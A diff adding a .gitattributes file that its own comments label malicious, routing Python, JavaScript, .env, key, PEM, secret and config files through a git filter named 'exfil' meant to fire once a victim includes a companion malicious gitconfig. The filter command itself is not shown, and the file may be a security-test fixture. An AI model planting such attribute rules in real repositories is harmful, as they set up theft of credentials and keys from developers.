@@ -1,0 +1,14 @@
+# Malicious .gitattributes that applies exfiltration filters
+# If a victim runs: git config --local include.path ../.gitconfig-malicious
+# Then these attributes will trigger the malicious filters
+
+*.py filter=exfil diff=exfil
+*.js filter=exfil diff=exfil
+*.env filter=exfil diff=exfil
+*.secret filter=exfil diff=exfil
+*.key filter=exfil diff=exfil
+*.pem filter=exfil diff=exfil
+*.json filter=exfil diff=exfil
+*.yaml filter=exfil diff=exfil
+*.yml filter=exfil diff=exfil
+*.config filter=exfil diff=exfil
